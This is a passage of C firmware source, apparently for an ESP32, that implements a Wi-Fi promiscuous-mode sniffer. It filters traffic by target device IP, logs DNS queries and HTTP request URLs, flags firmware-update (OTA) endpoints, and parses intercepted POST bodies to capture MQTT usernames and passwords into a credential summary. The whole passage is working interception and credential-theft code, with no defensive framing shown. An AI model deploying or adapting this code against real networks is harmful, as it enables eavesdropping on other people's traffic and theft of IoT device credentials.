                    else if (!strcmp(cred->key, "mqtt_username") || !strcmp(cred->key, "mqtt_user"))
                        strncpy(s_prov_summary->mqtt_username, cred->value, sizeof(s_prov_summary->mqtt_username) - 1);
                    else if (!strcmp(cred->key, "mqtt_password") || !strcmp(cred->key, "mqtt_pass"))
                        strncpy(s_prov_summary->mqtt_password, cred->value, sizeof(s_prov_summary->mqtt_password) - 1);
                    s_prov_summary->total_creds_captured = *s_prov_cred_count;
                    s_prov_summary->sensitive_creds_captured = s_prov_sensitive ? (int)*s_prov_sensitive : 0;
                    if (!s_prov_summary->first_capture_ms)
                        s_prov_summary->first_capture_ms = ota_common_now_ms();
                    s_prov_summary->last_capture_ms = ota_common_now_ms();
                }
            }
            if (tmp) free(tmp);
            item = item->next;
        }
        cJSON_Delete(root);
        if (s_prov_on_captured) s_prov_on_captured();
    }
    free(body);
}

static void wifi_sniffer_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA || !buf || !s_sniffer_active) return;
    const wifi_promiscuous_pkt_t *pkt = buf;
    const uint8_t *payload = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 28) return;
    int offset = 0;
    if (payload[0] == 0xAA && payload[1] == 0xAA && payload[2] == 0x03) offset = 8;
    else return;
    if (offset + 20 > len) return;
    const min_ip_hdr_t *ip = (const min_ip_hdr_t *)(payload + offset);
    if ((ip->version_ihl >> 4) != 4) return;
    int ip_hdr_len = (ip->version_ihl & 0x0F) * 4;
    if (ip_hdr_len < 20) return;
    uint32_t src_ip = ip->src_ip;
    uint32_t dst_ip = ip->dst_ip;
    if (s_sniff_opts.target_device_ip[0] || s_sniff_opts.target_device_ip[1] ||
        s_sniff_opts.target_device_ip[2] || s_sniff_opts.target_device_ip[3]) {
        uint32_t tip = ((uint32_t)s_sniff_opts.target_device_ip[0] << 24) |
                       ((uint32_t)s_sniff_opts.target_device_ip[1] << 16) |
                       ((uint32_t)s_sniff_opts.target_device_ip[2] << 8) |
                       s_sniff_opts.target_device_ip[3];
        if (src_ip != tip && dst_ip != tip) return;
    }
    int transport_offset = offset + ip_hdr_len;
    if (transport_offset + 8 > len) return;

    if (ip->protocol == 17 && s_sniff_opts.capture_dns) {
        const min_udp_hdr_t *udp = (const min_udp_hdr_t *)(payload + transport_offset);
        if (ntohs(udp->dst_port) == 53) {
            int dns_offset = transport_offset + 8;
            if (dns_offset + 12 <= len && s_dns_count_entries < OTA_MAX_DNS_ENTRIES) {
                int q = dns_offset + 12;
                char domain[OTA_MAX_DNS_NAME_LEN] = "";
                int di = 0;
                while (q < len && di < OTA_MAX_DNS_NAME_LEN - 1) {
                    uint8_t ll = payload[q++];
                    if (!ll) break;
                    if (di) domain[di++] = '.';
                    for (int j = 0; j < ll && q < len && di < OTA_MAX_DNS_NAME_LEN - 1; j++)
                        domain[di++] = payload[q++];
                }
                domain[di] = '\0';
                if (di > 3) {
                    ota_dns_entry_t e = {0};
                    strncpy(e.domain, domain, sizeof(e.domain) - 1);
                    memcpy(e.client_ip, &src_ip, 4);
                    memcpy(e.server_ip, &dst_ip, 4);
                    e.timestamp_ms = ota_common_now_ms();
                    e.is_ota_related = ota_common_is_ota_domain(domain);
                    ota_common_add_dns_entry(&e);
                    if (e.is_ota_related) {
                        char fake[OTA_MAX_URL_LEN];
                        snprintf(fake, sizeof(fake), "http://%s/ota", domain);
                        ota_common_add_url_from_sniff(fake, "[DNS]");
                    }
                }
            }
        }
    }

    if (ip->protocol == 6 && s_sniff_opts.capture_http) {
        const min_tcp_hdr_t *tcp = (const min_tcp_hdr_t *)(payload + transport_offset);
        uint16_t dst_port = ntohs(tcp->dst_port);
        if (dst_port == 80 || dst_port == 8080 || dst_port == 443 || dst_port == 8443 ||
            (s_sniff_opts.sniff_port && dst_port == s_sniff_opts.sniff_port)) {
            int tcp_hdr_len = ((tcp->data_offset_flags >> 4) & 0x0F) * 4;
            int http_offset = transport_offset + tcp_hdr_len;
            int http_len = len - http_offset;
            if (http_len > 10 && http_offset < len) {
                const uint8_t *http_data = payload + http_offset;
                const char *method = NULL;
                if (!memcmp(http_data, "GET ", 4)) method = "GET";
                else if (!memcmp(http_data, "POST ", 5)) method = "POST";
                else if (!memcmp(http_data, "PUT ", 4)) method = "PUT";
                else if (!memcmp(http_data, "HEAD ", 5)) method = "HEAD";
                if (method && s_http_count_entries < OTA_MAX_HTTP_ENTRIES) {
                    if (!s_sniff_opts.post_only || strcmp(method, "POST") == 0) {
                        const char *path_start = (const char *)http_data + strlen(method) + 1;
                        const char *path_end = strstr(path_start, " HTTP");
                        if (path_end) {
                            int path_len = path_end - path_start;
                            if (path_len > 0 && path_len < OTA_MAX_HTTP_URL_LEN) {
                                ota_http_entry_t entry = {0};
                                strncpy(entry.method, method, sizeof(entry.method) - 1);
                                memcpy(entry.path, path_start, path_len);
                                entry.path[path_len] = '\0';
                                const char *host_hdr = strstr((const char *)http_data, "\r\nHost: ");
                                if (host_hdr) {
                                    host_hdr += 8;
                                    const char *host_end = strstr(host_hdr, "\r\n");
                                    if (host_end) {
                                        int hlen = host_end - host_hdr;
                                        if (hlen > 0 && hlen < (int)sizeof(entry.host) - 1) {
                                            memcpy(entry.host, host_hdr, hlen);
                                            entry.host[hlen] = '\0';
                                        }
                                    }
                                }
                                if (entry.host[0]) {
                                    snprintf(entry.full_url, sizeof(entry.full_url), "%s://%s%s",
                                             (dst_port == 443 || dst_port == 8443) ? "https" : "http",
                                             entry.host, entry.path);
                                } else {
                                    strncpy(entry.full_url, entry.path, sizeof(entry.full_url) - 1);
                                }
                                memcpy(entry.client_ip, &src_ip, 4);
                                entry.timestamp_ms = ota_common_now_ms();
                                entry.is_ota_related = ota_common_is_ota_http_url(entry.full_url);
                                ota_common_add_http_entry(&entry);
                                if (entry.is_ota_related)
                                    ota_common_add_url_from_sniff(entry.full_url, "[HTTP]");
                            }
                        }
                    }
                }
                if (method && strcmp(method, "POST") == 0)
                    parse_provision_post(http_data, http_len, src_ip);
            }
        }
    }
}
